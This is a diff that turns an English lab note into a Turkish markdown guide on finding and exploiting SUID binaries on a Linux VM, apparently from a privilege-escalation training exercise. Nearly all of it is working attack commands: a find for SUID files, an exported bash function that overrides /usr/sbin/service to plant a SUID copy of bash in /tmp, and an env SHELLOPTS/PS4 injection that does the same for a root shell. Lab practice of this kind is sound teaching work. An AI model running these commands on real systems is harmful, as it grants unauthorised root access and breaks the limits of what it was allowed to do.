@@ -1,23 +1,60 @@
-Detection Linux VM
+# Linux VM SUID Tespiti ve İstismarı
 
-In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+## 1. SUID Binarilerinin Tespiti
+Linux sisteminde SUID bitine sahip olan dosyaları tespit etmek için aşağıdaki komutu çalıştırın:
 
-From the output, make note of all the SUID binaries.
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
 
-In command prompt type: strings /usr/local/bin/suid-env
+Bu komutun çıktısında yer alan SUID binarilerini not edin.
 
-From the output, notice the functions used by the binary.
+## 2. Binari İçerisinde Kullanılan Fonksiyonları İnceleme
+Binarinin içerisinde hangi fonksiyonların kullanıldığını görmek için aşağıdaki komutu çalıştırın:
 
-Exploitation Method #1 Linux VM
+```bash
+strings /usr/local/bin/suid-env
+```
 
-In command prompt type:
+Bu komut, binari içerisinde kullanılan string ifadeleri ve olası fonksiyonları gösterecektir.
+
+---
+
+## İstismar Yöntemleri
+
+### Yöntem #1: SUID ile Yetki Yükseltme
+Aşağıdaki komutları sırasıyla çalıştırarak, yetki yükseltme işlemi gerçekleştirebilirsiniz:
+
+```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+```
 
-In command prompt type: export -f /usr/sbin/service
+```bash
+export -f /usr/sbin/service
+```
 
-In command prompt type: /usr/local/bin/suid-env2
+```bash
+/usr/local/bin/suid-env2
+```
 
-Exploitation Method #2 Linux VM
+Bu adımlar, `/tmp` dizininde SUID bitine sahip bir bash shell oluşturacaktır. Root haklarıyla erişim sağlamak için aşağıdaki komutu kullanabilirsiniz:
 
-1. In command prompt type:
-env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' 
+```bash
+/tmp/bash -p
+```
+
+---
+
+### Yöntem #2: `env` Kullanarak Yetki Yükseltme
+Alternatif olarak, aşağıdaki komutu kullanarak benzer bir yetki yükseltme işlemi gerçekleştirebilirsiniz:
+
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+```
+
+Bu yöntem, `env` komutunu kullanarak bir bash shell oluşturur ve root yetkileriyle çalıştırır.
+
+---
+
+
+
